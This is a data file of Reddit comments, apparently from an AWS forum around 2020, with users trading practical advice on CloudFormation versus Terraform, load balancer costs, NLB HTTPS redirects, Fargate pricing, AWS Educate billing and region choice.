g5he36m,isrbo2,"Ah. Makes sense now. The 404 of Cloudformation YAML, I suppose.",1.0
g5l1t1m,isrbo2,Yeah I mean Cloudformation is probably fine if you consistently use it and keep it up to date. I just had an absolutely miserable experience with it in comparison to light touch Terraform. I tend to not reuse tools that burn me for years.,2.0
g59wwr9,isrbo2,Thanks for the recommendation! I will add it to the list for the next update. Appreciate the suggestion,1.0
g5alyu9,isrbo2,I would highly recommend suggesting Terraform over Cloudformation to someone with no Cloudformation experience. You can turbofuck yourself with Cloudformation really easily in ways you can't easily fix.,3.0
g5ape7l,isrbo2,As someone who has only used CF (and never TF) - how do they differ in this regard? I’ve had a couple of stacks in a broken state which took a while to fix.,1.0
g5bf81l,isrbo2,Please use CDK to create your infrastructure. At this point there is no real reason to use CF templates directly.,1.0
g5dtjg3,isrbo2,"Well.. except to be closer to AWS and deploy from CLI. Once you get those down, you can automate the creation of a complex service down to something a salesperson (or sales-script) can start after billing clears it.",1.0
g5dz83p,isrbo2,Not sure I understand. CDK can be deployed using a CLI too.,1.0
g5eg8th,isrbo2,"Ah, I was only aware of it's use to make cloudformation templates.  
  
I need to read up on CDK.  
  
The only big advantage I can see with Cloudformation is giving someone a file and telling them to run it with preset inputs. No need to worry what language or of CDK is or isn't installed.  
  
CDK and SDK could be used to build some interesting stuff.",1.0
g5dodqp,isrbo2,"I like the idea of Cloudformation. The practical use of completed Cloudformation templates is awesome. 
  
There are no tools for building Cloudformation templates. It's essentially you writing YAML. There's some weird status about AWS designing ""Cloudform Beta."" Which can essentially port the framework of your VPC to YAML. This sounds awesome, but where is it?   
  
And the Cloudformation Designer? Man, that is a disaster. I can't draw, and even I can make clearer diagrams. And the code that comes out of it looks horrible. 

It's easy to see why people hate making Cloudformation Templates. It's nice that those templates can interlink with each other and do service/file installs on EC2s. I just don't want to be a human compiler doing the linking.",1.0
g5msr7n,isrbo2,"&gt;  ""Cloudform Beta."" Which can essentially port the framework of your VPC to YAML

You might be looking for [CloudFormer](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/cfn-using-cloudformer.html)",2.0
g5dqhls,isrbo2,"But in the end, I am going to use Cloudformation. I may end up building tools to simplify building YAML templates.",1.0
g59v54e,isrbo2,S3 is a gentle introduction to AWS but EC2 is probably best since you have something to compare against (if you have server administration experience),6.0
g59x1f7,isrbo2,Couldn't agree more!,1.0
g5cya9c,isrbo2,I'd appreciate Route 53 (with new interface) course,1.0
g5dwak4,isrbo2,"Stepping back from this, I really feel that starting with a Solutions Architect Associates study course is going to cover all of this except:  
  
- Sagemaker, Lightsail, Chime, Cloud Directory, and Inspector.  
  
Doing a study course will arrange things in a logical order.  
  
This list seems intimidating. As it assumes a ""go google all of these without guidance"" kind of direction. I recommend against that. A udemy course will be faster and conserve your energy for learning, not frustrating dead end googles. It's money well spent.",1.0
g5asmpw,isrbo2,DynamoDB anyone? Especially with Lambda.,0.0
g5du9sd,isrbo2,"That's going into a serverless specialization. Which isn't a bad idea, but you need to include APIs",1.0
g6m0ysq,isr0en,"From my research the answer is no, reason being WAF is an incoming-only engine; it has no awareness of what the return codes have been. When I thought about this, I realized it was pretty silly -- that would require AWS to keep count of all errors for all IPs hitting the CF distribution for a rolling 5 minute window (pretty heavy design burden).",1.0
g5as935,iso0hj,"You may be able to solve your concurrency issues by adding SNS into your workflow. You also gain cross-region functionality with SNS-&gt;SNS. You can utilize attribute filtering on SNS consumers to have them automatically filter messages based on certain attributes in the message (such as region.)

SNS (global / source) --&gt; SNS (region) --&gt; SQS (region) --&gt; Lambda (region)",1.0
g58xis4,isnqsm,perhaps you chose the wrong profession?,8.0
g5j5kua,isnqsm,"I chose a profession that is LITTERED with learning disabled. And it shows. Everywhere I look these genius coders don't know how to string a sentence together, make a clear gui or logically design something larger than what's on their screen. Case in point. 

If I choose and AWS image and go out of my way to select a larger disk than 15GB .. what makes you think it's okay to make it a 10 step process to expand it. And cost someone hours on something they'll never need again.",1.0
g58sgj8,isn3g0,"I think you may be starting from https://aws.amazon.com/about-aws/whats-new/2019/08/amazon_workdocs_migration_service/ . The Amazon Workdocs Migration Service migrates data stored in S3 into Workdocs. You can get the data into S3 however you want, but they talk about how to do it with Datasync.",1.0
g58u4h7,isn3g0,"This helps.  So S3 is required, DataSync is not, but probably makes things easier.  Well this gets me pointed in the right direction again, thank you.",2.0
g59ihjv,isn3g0,"Hi,
I think this link can be useful 👇🏽
https://docs.aws.amazon.com/workdocs/latest/adminguide/migration.html",1.0
g58t12h,ism5ye,"I passed on the first go like a year ago, but the part I struggled with wasn't  AWS knowledge or trivia, it was pure reading comprehension. Like they have complicated setups, and even though its multiple choice, you have to read 4 long ass answers with subtle differences.  It was taking me too much time on each question to actually read and understand. That was the first (and only) time in my life I would have liked to have extra time as an accommodation on an exam.",2.0
g58pfs5,islzhd,"Cost for internal and external load balancer is the same \~20 USD +  LCU pricing. You should use two load balancer, one internet-facing and one internal. When you provisiona load balancer, it creates elastic interface in each AZ you chose. Than you will get DNS name which resolves to public ip (internet-facing) or private ip (internal). Those addresses can change any time so you should always use DNS name. Now, if your service is in private subnet and you provisioned internet-facing ALB, it will first go through your NAT gw to internet and go back through ALB - it is not optimal and will cost you a lot. If you are really on a budget, you can try to provision internet facing LB, write lambda that will periodically check its private ips (on elastic interfaces) and update custom dns record. Use this record for private workload. Remember that your clients have to be able to resolve this record, you need to configure your dns properly. Haven't tried this approach.",4.0
g5ad5g7,islzhd,You should have your lb in a public subnet and route traffic from it to the subnet of your services in the private subnet. I'm not sure where you're going to go through your ngw?,0.0
g58v16b,islzhd,"When you access from the internet, you pay egress fees, starts at 0.9$/Gb.

When you access from an instance to the lb public ip, you pay 0.01$/Gb in each direction (that's 0.02$/Gb).",3.0
g58wavy,islzhd,"There is a free trick that you can do,

Go to the EC2 console, and then to Network interfaces, search for your load balancer internal IPs, as shown here - [https://ibb.co/9Z09DmL](https://ibb.co/9Z09DmL). (don't hardcode the IPs, they change frequently).

all the instances that are in the same az as the lb, can talk with the lb internal IP.

if you connect to lb IP from another az, you will pay 0.01$/Gb per each direction (that's 0.02$/Gb).",3.0
g59qyz4,islzhd,Do you have a link that exlpains the second part?  I'd like to share that with my co-workers.,1.0
g5bsbgz,islzhd,"there is a guide about how to get the internal IP's in [this link](https://aws.amazon.com/premiumsupport/knowledge-center/elb-find-load-balancer-IP/). 

in the networking pricing page, they write: 

""Data transferred between Amazon EC2 ... instances and Elastic Network Interfaces in the same Availability Zone is free""

&amp;#x200B;

And because the instance and the lb are in the same az, when you access the internal IP, it's free.",1.0
g5cx1ot,islzhd,"Good advice here guys, thank you!",1.0
g58jpw3,iskqbj,"I'm not aware of anything built-in unless it's relatively new. I worked around by setting up a self-hosted Kibana at a vanity URL that merely pointed to the ES data endpoint. Somewhat more maintenance effort, but prettier URLs.",5.0
g58x3a1,iskqbj,"Okay, but this is for a public ELK implementation.  So with this workaround, I'm now orchestrating Kibana, Logstash, and nginx proxy with something like kubernetes.  At this point it's probably easier to use ECK which includes ES too and would simplify my setup while giving me greater control over my cluster.  

Why would I want to use AWS ES service at this point?  UltraWarm is all that's left and I'm not sure it's worth that much to me considering I have to use a CFN lambda-backled custom resource to manage the cluster since UW isn't supported by CNF right now.  Oh and ECK is cheaper too AFAICT.",1.0
g59hxsk,iskqbj,"Because normally you use the Kibana in the ES service for your internal users, so they don't care about the url.",5.0
g5a0jqp,iskqbj,This is the correct answer.,1.0
g5bdo1p,iskqbj,"And what happens when it's time to migrate to a new domain for whatever reason?  Everyone has to update their bookmarks, confusion and resentment from users starts setting in slowly.  No thanks 1990 internet.",0.0
g5a0voy,iskqbj,"What are you leveraging k8s for, the reverse proxy? I'm asking since the entire Elasticsearch service is in the AWS VPC with exception of whatever EC2 or container you run to connect to your Kibana endpoint.",1.0
g5cckw4,iskqbj,"The problem with VPC clusters is that they're only in the VPC, so maybe OP wants to be able to hit the cluster API from a dev machine / laptop. The proxy could be for that usecase. (I used Kubernetes port-forwards to accomplish dev access)",1.0
g5cjcml,iskqbj,I want to be able to reach kibana from customer browsers (so our onsite team can debug the app).  This means I need a non-VPC setup AFAIK,1.0
g5cp4bz,iskqbj,"Not true. You can put your proxy behind a public facing ALB and control access with a security group. That's how mine is setup today.

Then create a dns record that is more friendly that points to your ALB.",1.0
g593lhh,iskqbj,I talked with AWS about this a few weeks ago. There is currently no option for public custom dns names and certificates.,2.0
g5cprmh,iskqbj,The callback URL can't be changed but there's nothing stopping you from using R53 to make a friendly name that points to a load balancer.,2.0
g5cmk2r,isls8o,Great for low volume/small scale. Incredibly expensive at scale. EC2 w/ auto scaling groups are a bit more management but cost 4x less. They have their niche.,3.0
g5cn3e6,isls8o,Our fargate on spot clusters are fairly economical without ec2 management overhead.,3.0
g5f2k26,isls8o,What sort of workloads are you running? I am super interested in your story.,2.0
g5f7kqy,isls8o,"I teach 50% of america how to read and do math.  Our edtech product has ~60 ecs micro services, 170 lambda, and 60 data stores, etc.

These systems use aws native technologies, like fargate because there's `value-differenting task` for my teams to focus on.",3.0
g5coz1h,isls8o,"""Management overhead"" is really just setting up an ASG. It's not really difficult. Glad you've had success with Fargate. Do you use ECS on there? That's been a nightmare for us. So much config to do any little thing. I hope they've improved it.",-1.0
g5cqf4y,isls8o,What issues did you encounter and how does your ec2 solution diff?,1.0
g5cv23x,isls8o,I can just use ansible to fire up a container. That’s easy. Configuring ECS was a yuuuuuge chore to do one little thing.,1.0
g5i2jrd,isls8o,"Have you tried out AWS Copilot? You can get a production environment on Fargate with a single command. 

[https://github.com/aws/copilot-cli/](https://github.com/aws/copilot-cli/)",1.0
g5df0y8,isls8o,"patching that underlying OS is a customer responsibility. If your organization is security conscious, you're hardening/patching your AMI to taste which introduces cost and overhead.  


protecting that full instance and it's docker socket is another thing too.",1.0
g5donn8,isls8o,I guess I don’t understand what’s so difficult about it? Updating and securing a Linux OS is pretty trivial. Especially if you keep things simple and you don’t introduce a bunch of third party daemons (cough cough kubernetes/ecs),2.0
g5f8954,isls8o,"If you have one person to manage these images, there's ~35k/yr.  Now if live site issue occurs, your tier 2 support begins at 55k/yr per person.  Factor in extended support contracts and that's maybe 10k more.

So, there's 100k/yr plus benefits to beat 4c vs 5.4c per core hour.  Depending on your scenario and where multiplier lays that's big money.",2.0
g5hl2ba,isls8o,"IMO—Way low on estimates. You'll be looking at a minimum of one person to harden base line images. You'll need scanning, SOC, IDS, etc—plus management and configuration of all of those things, just for EC2, if you are doing it right.",1.0
g5f8k0x,isls8o,"Thankfully we hire better than that. I understand what you’re saying though. Time certainly isn’t free but we’re still on the right side of this by a long shot.

Also we’re at about 8x cheaper on ec2 than lambda. Those nickel and dimes add up indeed!

Lambda is great when you don’t need scale. Lambda will scale, oh it will scale. But it will scale by ripping your bill a new one.",1.0
g5bt4us,isls8o,Using digital ocean and openfaas,-1.0
g58iwdw,isjwmu,"You cannot reassign a workspace to a different user. Generally, the best practice here is to either use the profile migration tool, or create another workspace for the same user in a different Directory (AWS directory). Depending on the back-end you're using, this usually means creating a new Active Directory Connector that points to the same underlying AD.",3.0
g5cjf6w,isjwmu,"If this is something you're doing at a small scale, you can just spin up the new instance, set it all up in parallel, take an image of the new instance, apply the new image to your chosen bundle and then migrate/rebuild your current workspace. The only downside to doing it this way is you'd keep all your D:/ data. If you don't want the data simply create the gold image, destroy your current workspace and re-deploy it from the new image/bundle.

Obviously if this is for a large scale deployment this doesn't really work as well.",1.0
g58as40,iskyv1,It seems like any attempt to subvert brazilian laws are not going to result in long term success for your business working with the actual government. You are probably going to have to run servers in amazon brazil or risk the whole thing falling apart when someone notices the grift you are pulling.,11.0
g58bzz6,iskyv1,"There's nothing against law here. The only reason why some of the government servers block international IPs are ""just"" a firewall protection.",2.0
g591nos,iskyv1,a lot of countries have very specific laws on where data can be stored or how interactions are taxed.,5.0
g5ajoi5,iskyv1,"Instead of using a NAT Gateway, consider using a small Squid proxy and have your code use the proxy when relevant.",4.0
g588v8e,iskyv1,Why can't you just run servers in that region? What's your issue there?,5.0
g589hg9,iskyv1,"Really fair question. `sa-east-1` is the most expensive region, the double of `us-east-1`.",5.0
g5c9ine,iskyv1,"As others say, VPC peering doesn't support transitive routing. You would either have to use a TGW so you can route your traffic to the NAT gateway or create your own proxy on an EC2 instance to use that.",2.0
g5fl85w,iskyv1,"Alternative approach...

- provision us east compute instances

- s3/DynamoDB/etc. in us east

- s3/DynamoDB/etc. in Brazil

- enable replication services

- provision Brazil compute instances

Then run completely separate writing to local store and making Amazon solve this.",1.0
g595d58,iskyv1,"you won't be able to use nat gateway (it's a regional resource and you can't route traffic from another region). 

&amp;#x200B;

you should setup a nat instance in each region and route the traffic through it.",1.0
g587vfv,iskm73,"Did you try having two target groups, one for port 80 and one for port 443? Same instance will be registered into these two target groups. NLB will have two listeners for 80 and 443 forwarding to relevant target group.",3.0
g58bbwf,iskm73,"I have the two target groups setup, but editing (or recreating) the listener won't allow me to choose the second target group. It seems that whatever target group you associate when creating the NLB is what you're stuck with forever?

Or maybe I should try it from the command line instead of console... that sometimes gives different results.",1.0
g58h7z9,iskm73,"So actually... if the target group's listener is https it won't let you select it when editing the listener (which is what I was trying). HOWEVER, if that target group's listener is TLS then you CAN edit the NLB listener and select it.

Which I think solves my problem!",3.0
g5901rz,iskm73,Do 443 -&gt; 443 with self signed certs on the ones behind the vip.,3.0
g58wgxw,iskm73,"One that messed me up was not trusting proxies with the service that was listening to the port.

For express with NodeJS you need to ensure trust proxy is true. Might want to check if you need to do something similar",1.0
g59ldm8,iskm73,"I can't remember if its ALB or NLB but one of them gives an option to forward and an option to redirect.

So you could have:

LB 443 forward app 443
LB 80 redirect app 443

Assuming the LB becomes the sole gateway then you can either remove your app redirect or leave it there but you should then have no internal traffic on 80.

You'll need two certificates to do this. You can use Certificate Manager to generate a public cert for the LB and then use either a self signed or third party cert on the app server (can't use Cert Manager as Amazon keep the key) but self signed is fine.",1.0
g59lw00,iskm73,"ALB can do it. Unfortunately, for a couple reasons, I couldn't use an ALB in this scenario.

Thankfully, I was able to get it going with NLB. Two target groups, each with the same server. One for 80 and one for 443.",1.0
g5fogks,iskm73,"Sounds like its all sorted, but just FYI you can have an ALB as the target of an NLB, with your instances as the target for the ALB if you really need.

[https://aws.amazon.com/blogs/networking-and-content-delivery/using-static-ip-addresses-for-application-load-balancers/](https://aws.amazon.com/blogs/networking-and-content-delivery/using-static-ip-addresses-for-application-load-balancers/)",2.0
g58a9ke,iskm73,Are you able to terminate SSL at the load balancer? And route all traffic to 80 on your app?,1.0
g58bnjn,iskm73,"That's how I got into this mess :-)   Terminating SSL at the LB is easy. Sending all traffic to my app over 80 is trivial. But then my app says, ""hey - that's not SSL. Let's redirect you.""
Client hits SSL. LB sends it port 80 to the app. App says, ""hey - that's not SSL. Let's redirect you.""

Client only knows about that hop from the LB to the web server, unfortunately, so only ever sees it as non-SSL.



repeat endlessly. Browser barfs.",1.0
g595ccb,iskm73,If you can use Application Load Balancer (you not be able to...I didn't read the entire thread) you can have the ALB do the redirection and only listen to port 80 on the backend servers and get rid of any janky IIS code that redirects.,1.0
g597kw1,iskm73,Definitely where I'd like to get to!,1.0
g59cac7,iskm73,[https://aws.amazon.com/premiumsupport/knowledge-center/elb-redirect-http-to-https-using-alb/](https://aws.amazon.com/premiumsupport/knowledge-center/elb-redirect-http-to-https-using-alb/),1.0
g58978a,isk7if,"here is one idea that should be simple: accessibility checker for some web api. that is, cloudwatch event runs your lambda e.g. once every hour, tries to access some public web api (some google api, or some weather station), and sends an sns notification on failure or on a certain condition (like storm nearby). you can also collect statistics, or suppress messages for a time period, persisting data to dynamodb.",8.0
g588ozk,isk7if,"Depends how deep you want to get.. Lambda function can be triggered by numerous events. An API request with API gateway, a message added to a queue with SQS, data update in DynamoDB, run on a schedule like cron, etc, etc, etc.

But - why not start with Amazon's own tutorial? [https://aws.amazon.com/getting-started/hands-on/run-serverless-code/](https://aws.amazon.com/getting-started/hands-on/run-serverless-code/)",3.0
g58qjex,isk7if,How about using Lambdas behind an API gateway to start and manage quake servers? You could probably use ECS to run the quake servers for this. You'd get to use the AWS APIs from the Lambdas. Perhaps you can have Lambda timeout a quake server from inactivity.,1.0
g5alakw,isk7if,"Where I work we give new guys into the team a task of automating something like object uploaded to S3, event triggers, lambda processes &amp; does something with it (like adds data to Dynamodb or something), send a notification.

The above covers a lot of AWS resources &amp; skills, it also meets a lot of what we do so new people can become comfortable with what's expected.",1.0
g5asz58,isk7if,Generating thumbnails for pictures uploaded to s3 is a classic use case.,1.0
g57zvew,isjc8w,"AFAIK, not sure about it, you need to double-check. Free tier t2.micro is free until 750hrs/month or something like that. You will be charged after this.",2.0
g58ngcy,isjc8w,"750 hours are 31 days (more or less), I'm running this VM all month, how can that be?",1.0
g580609,isjc8w,"How old is it? Free tier is not free forever 


https://aws.amazon.com/premiumsupport/knowledge-center/free-tier-charges/",2.0
g58nhx5,isjc8w,I have this Educate account since April 2020,1.0
g58pqbc,isjc8w,Go into to cost explorer and it can help you see where the charges are coming from,1.0
g58z0t7,isjc8w,"You dont have the required permissions to do this. Same with everything involving budget or costs, various parts of AWS (oftentimes not accessible whatsoever), creating certain kinds of users/roles, etc. In addition, you need renew your credentials (access key, secret,.session token) every 2h to use them and the website often requires renewal much more frequently even if you're in the midst of setting up something. 

All in all, it's nice and all that they offer this. But the restrictions are very crippling and make even basic things a chore",2.0
g59eafc,isjc8w,"Exactly, that's the main issue with AWS, not being able to view the costs.",1.0
g59kitg,isjc8w,"Sounds like your account could to ties to another organization if you cannot get in

Even under free tier this should be available

Open a ticket",1.0
g59p1mn,isjc8w,"Yes, every aws educate account is tied to an organization (mine is tied to vocasoft or something along those lines, the default access portal to awseducate) by default and thus restricted. 
You cannot change these to my knowledge (even support is not accessible iirc)

Here's an outliner:

https://aws.amazon.com/education/awseducate/aws-educate-faqs/

That's what making using this so bothersome: even using just seemingly 'free' services (using the premade tutorials or presets offered by the web interface) often I suddenly see my remaining credit drop without any way to see what's causing this. 
You cannot use your credentials anywhere really because they are reset either on every portal visit, every two hours, or just because, whatever happens first. 
In addition, the portal is both slow as hell and apparently badly written as very frequently the CPU usages spikes to 100% (of one thread). Might seem not so bad because you can kill it easily, but because all credentials renew everytime you reload/visit the portal it's such a bother.

 I've written a small cli program to fetch the credentials (~30s for one run) just to somewhat alleviate the problem. 

It has really done a good job making me dislike AWS — sudden charges, no way to see where came from or why, many tools and third party services are not usable (basically, everywhere you normally would enter the access and secret key of a locked down user), some pretty basic services are not allowed (for example, amplify cannot create an api as you are missing the permission to create some resource, I think appsync related) are such a headache compared to say azure or Google cloud",2.0
g58ir1c,isjc8w,I'm not a 100% sure but I've read somewhere that Educate accounts do not qualify for the free tier.,2.0
g58nktr,isjc8w,I will contact support and check with them,1.0
g58ny7a,isjc8w,"Here, I found where I read what I read. Take a look 

https://forums.aws.amazon.com/thread.jspa?messageID=913856&amp;tstart=0",1.0
g59e6qd,isjc8w,"Thanks, I sent an email to AWS, let's see If that still applies.",1.0
g59kbxh,isjc8w,"AWS Free Tier includes 750 hours of Linux and Windows t2.micro instances, ( t3.micro for the regions in which t2.micro is unavailable) each month for one year. To stay within the Free Tier, use only EC2 Micro instances.",2.0
g59puox,isjc8w,"Yeah, especially when you are using the premade solution (like RDS free tier) and suddenly losing credit balance. 

Or those little charges like a few cents a day that you simply cannot explain. You need to go to every service and check if somehow something didn't end up creating a resource that's just sitting idly. 

Iirc, you cannot even access the tag editor or anything enabling you to somewhat get a bird's view of your resources and cross reference every billing doc for every service.",1.0
g57zpl4,isj6fp,"Yes, after a fashion. All API calls are recorded in CloudTrail (even what you do in the console). This includes a user agent string from your browser etc.",6.0
g593m73,isj6fp,Ah OK thank you!,1.0
g58932r,isj6fp,Do you mean AWS WorkSpaces?,1.0
g593k37,isj6fp,Yes sorry I meant that!,1.0
g57yx8r,ishmja,"This might be a controversial opinion, but you're confusing two things.

A backup (IMO) is simply a copy of the data and any metadata you deem necessary. It shouldn't be accessed by anyone except an admin, in the case that it's needed. So permissions don't matter because only the admin should be able to see them, if your users can see them, then they can ""damage"" them, and it's no longer a backup.

You appear to be talking about actually having a live file share that people interact with like they would a normal share, but in AWS?",12.0
g58e8bx,ishmja,"Not sure why this would be controversial, it’s a perfectly valid and correct distinction.",4.0
g581nhx,ishmja,It doesn't sound like you want a backup. It sounds like you want a cloud based file storage and collaboration platform. Check out box.com or Dropbox for business. There are other competitors in the same space too. This would essentially replace your office based server for file storage/sharing.,7.0
g583fiz,ishmja,"I second this. Box.com, Google Drive, or One Drive. AWS is great but these tools are more mature than something like WorkDocs",7.0
g5a6zhr,ishmja,100%. You want a cloud file collaboration platform. All the mentioned solutions will solve this.,1.0
g58282m,ishmja,Nearest Amazon solution for what you describe is [Amazon WorkDocs](https://aws.amazon.com/workdocs/).,3.0
g57zsg7,ishmja,I recommend a service like https://www.backblaze.com/business-backup.html,2.0
g59fvj0,ishmja,"With Amazon WorkDocs, you can easily migrate existing content from legacy network file shares to the cloud and your users can continue to access all their individual and team’s shared content from their native desktop file systems through WorkDocs Drive, or through the web user interface or mobile application.",1.0
g57yifp,isgvq4,"Our tam said you can open a ticket with support to stop the emails from coming out. I haven’t tried it yet, so not sure how true it is, but give it a whirl.",1.0
g5812vm,isgvq4,I've heard that could also use a tag on connections you don't want to be notified,1.0
g58c0qy,isgvq4,Do you happen to recall any info about that tag and value would be?,1.0
g58syu8,isgvq4,"DX yes, I hadn’t seen this in the VPN docs",1.0
g598u7c,isgvq4,"Ah yes, I might confuse this with DX notifications. Maybe it works for both?",1.0
g58t6yq,isgvq4,"Like the email says “or to opt-out of these notifications, please contact AWS support”",1.0
g59tihl,isgvq4,Yeah that notification is annoying. Even the [AWS docs](https://docs.aws.amazon.com/vpn/latest/s2svpn/Cisco_ASA_Troubleshooting.html) state that Asa can't support two active tunnels,1.0
g57y388,isix59,Why are you trying to create a new subnet when it appears you already have that part done?,1.0
g57ztc1,isix59,"It seems I need to associate a subnet to the route table but good question.

I can associate one of the existing subnets but then the console says they're out of the Main table which concerns me so I figured if I create one for this specific purpose then it would have less consequences.",1.0
g57zre3,isix59,"* Have you created routes on both side of the Peering ?
* Have you set some NACL ? (it may block your traffic as well)

The proper order is like that:

* create peering between VPCs
* create subnet inside your VPC (where the DMS will work)
* create routes in route table from your subnet to the peering
* create subnet group in DMS pointing to your newly created subnet
* on the source account, make sure the traffic to your target account is configured through the peering  

* on security group enable all traffic from peering / source account IP range  


That should work",1.0
g58dxzp,isix59,I hadn't setup routes on both sides but have now done that. Thansks for pointing that out.  The rest makes sense except if I still need to create subnets then I'm stuck on the question about what range it would want.  But I'll go over your list again and see if something clicks. Thanks!,1.0
g58w7on,isgep8,"In full disclosure we've been in the space for some time and we're building Mist (https://mist.io) which is an open source CMP.

Others in the space include:

- Cloudbolt
- Cloudforms aka ManageIQ by Red Hat
- Embotics
- Flexera
- Hypergrid
- Morpheus Data
- Scalr
- VMware

Out of all these, Mist and ManageIQ are the only open source options. Mist is more infrastructure agnostic and supports more platforms. In addition, we believe Mist to be the best option for day-to-day use as its simpler, without lacking functionality. It's also well suited for brown field deployments. There are no migration steps involved.

Having said that, the problem is very wide. Nobody solves it entirely and depending on your use case it might make sense to choose something else.

The biggest problem with most CMPs is that it's hard to cut through the marketing and sales talk. You would be much better off if you define your needs and then go out and start testing.",2.0
g5cf9gm,isgep8,"Right! requirement definition and testing is the key, I just wanted to understand views, experiences and also if possible try to narrow down options",1.0
g58ks6o,isigqo,use 'dig' to find out what you are really pointing to.,1.0
g598sto,isigqo,Great idea. Just checked and dig is returning my defined route53 values for both domain.tld and sub1.domain. tld.,1.0
g59aerk,isigqo,make sure you're not caching stuff in the browser,1.0
g59qlyj,isigqo,"Well fwiw, I changed my “www” entry from an ‘A’ record to a ‘cname’ record, and everything started working again.

From: A - www.domain.tld - x.x.x.x

To: CNAME - www.domain.tld - domain.tld",1.0
g59c6mz,isem6x,"Hello! If you're interested in supporting asynchronous notifications that can can come from AWS, you might want to take a look at [AppSync](https://aws.amazon.com/appsync/); it's a service that not only gives you a way to access data via GraphQL, but also supports subscribing to events via WebSockets.",1.0
g588cuu,isdnpw,"This question seems more related to your convenience rather than an architectural.

Go for the option for which your organisation has budget and people(developer).",2.0
g5bsraz,ise8pq,Anyone?,1.0
g5g3i9d,ise8pq,"I have this same requirement. Currently we have an SNS topic on a Cloud Watch alarm, but that just sends the generic alarm email. It would be useful to see the log that caused the alarm.

I haven’t done this yet but I have 2 approaches in mind to try:

1. Rather than the cloud watch alarm SNS sending an email, that could be set for an HTTP hook. Those have some metadata in the http body so we might be lucky to get the log line in there. If that works we can hook that up to a Lambda and let the Lambda format and send the email via SES.
I don’t think that is likely though, I don’t think cloud watch alarm will have enough context.

2. Similar approach to above, alarm to HTTP -&gt; Lambda. This time we use Cloud Watch API to try to figure out and read the line.

Once again not sure these will work, but these would be my next steps to try.",1.0
g57ffdt,isdvi0,"Don’t even question it, go us-west-2. West-1 doesn’t get services out of the gate, frequently seems to have capacity issues, and is like the red headed step child of US regions. Save yourself the headache, go Oregon.",43.0
g57lk0b,isdvi0,"Listen to Flakmaster92, I'd also add to his list that us-west-1 is generally speaking more expensive than us-west-2 since everything from real estate to power in the bay area costs more than it does in Oregon. 

The main reason to be in us-west-1 is if you have nearby services and require low latency.",11.0
g57m0hv,isdvi0,Apparently also west-2 is the greenest region since most electricity comes from hydro,11.0
g585gou,isdvi0,Is there a source I can use for this info? I know AWS is trying to hit 100% renewables in the next 5-10 years but didn't know there were specifics like this shared.,1.0
g58mh4v,isdvi0,"This particular one I read somewhere but not an official source so cant confirm.

https://aws.amazon.com/about-aws/sustainability/ 
This page has a bit more info on how they get power and where",2.0
g584pmz,isdvi0,Which is why they are introducing Local Zones (currently available in LA) [https://aws.amazon.com/about-aws/global-infrastructure/localzones/](https://aws.amazon.com/about-aws/global-infrastructure/localzones/),2.0
g5865ql,isdvi0,Thanks for the info! Think I’ve decided on Oregon!,2.0
g57j60l,isdvi0,"Yup, spent months getting out of there because of the lack of features and only having 2az's. All because someone clicked button without realizing the implications.",5.0
g57guef,isdvi0,"Sydney here, hold my beer",7.0
g57gif8,isdvi0,"Good to know, thanks.",2.0
g57wava,isdvi0,"us-west-1 is more expensive and gets features released much later than other regions, here’s a good blog post https://www.concurrencylabs.com/blog/choose-your-aws-region-wisely/",3.0
g5arahe,isdvi0,*Cries in us-govcloud-west-1*,1.0
g5b1mpq,isdvi0,"I work in GovCloud, East and West, trust me, I know.",1.0
g57ck15,isdvi0,That’s an excellent question.,7.0
g5b1cmb,isdvi0,Not all regions are created equal. us-east-1 and us-west-2 are the big bois.,3.0
g57ef60,isdvi0,"Speculating this is about capacity issues. Idk the history of the region but in the early days of aws each customer would get the same data center for us-west-1a for example. Most/a lot of customers don't use multi aź stuff so they had a big imbalance between one aź within each region(as the default option for starting an ec2 was the a aź) which made them go the step of randomizing aź to exact data enter mappings. So your us-west-1a could be different than mine. Anyway because moving clients is hard when that zone imbalance grew to a certain level aws stopped allowing new accounts on a specified aź while also not getting enough requests to further increase the region. My advice would be to just go with Oregon, us-west-2",4.0
g57f2mp,isdvi0,"Quite the opposite. In the early days, availability zones were randomized for each account. Your us-west-1a could have been different from my us-west-1a and it was done this way specifically to prevent the issue you've mentioned.",11.0
g57glw9,isdvi0,"Yes, us-west1a for different account will be different. This is done to avoid overloading a single AZ",2.0
g57mhq5,isdvi0,"Yes this is the case now, with the exception of bigger clients that have multiple accounts where aws can make all accounts have the same randomization between aź and actual location, but are you sure this was in the first iteration? The story that I related about how zone imbalance initially appeared was told to me by my first instructor back in 2013-2014.. So just take it with a grain of salt.",2.0
g58ak0r,isdvi0,"You didn’t have to be a big account to request accounts that you control get the same mapping, you just had to open a basic support request.",2.0
g57kegt,isdvi0,"It's pretty crazy that some customers don't use multiple AZs, although not really surprising.",1.0
g584tah,isdvi0,For some workloads its just extra cost and more load balancers / gateways to protect against a few hours down a year.,1.0
g58jvou,isdvi0,"It all depends on the requirements.  I manage some single-AZ infrastructure.  SLOs are pretty lax, so not worth the 1c/GB to shuffle data between AZs.",1.0
g57l5wt,isdvi0,What is an AZ?,1.0
g57lf0w,isdvi0,[Availability Zone](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-regions-availability-zones.html#concepts-availability-zones),2.0
g57lfq7,isdvi0,Thanks,1.0
g571rf0,isccg5,"Yes. Just make sure your lambda is attached to your VPC. 

I refuse to use the incorrect nomenclature “running in your VPC”.",5.0
g5726yl,isccg5,Thanks and why? Incorrect nomenclature,1.0
g573ghd,isccg5,"Lambda always runs in a dedicated VPC and attaches to your VPC via an ENI. 


https://aws.amazon.com/blogs/compute/announcing-improved-vpc-networking-for-aws-lambda-functions/",4.0
g57z0ks,isccg5,"To be accurate, nothing actually runs ""in a VPC"".

Instead, resources are **attached to a VPC** through Elastic Network Interfaces (ENIs).

A VPC is a virtual construct designed to allow controlled communications between certain resources, mimicking traditional hard-wired networks. Traffic *logically* flows through a VPC, but the *actual* traffic runs on a traditional wired network with several layers of abstraction and encryption.

It hurts my head just to think about it.",3.0
g57re01,isc1we,"IAM itself would not be used to configure an EC2 instance.  IAM provides a permission scheme for access to AWS APIs.  If you wanted to grant an EC2 instance the permission to interact with other AWS services, you'd want to use an IAM Role attached to the instance.  In the context of configuration, maybe your instance bootstrap process needs access to some resources in a private s3 bucket.  So you attach a role to the instance that gives it read access to that s3 bucket, thus allowing your configuration script to use the required resources.",1.0
g57u9go,isc1we,"You can give an EC2 instance an IAM Role with permissions to do anything from that instance including EC2 APIs to run or do anything to EC2 instances.

Please practice least privileges when creating that role. If that instance gets compromised, an attacker can do anything the role allows.",2.0
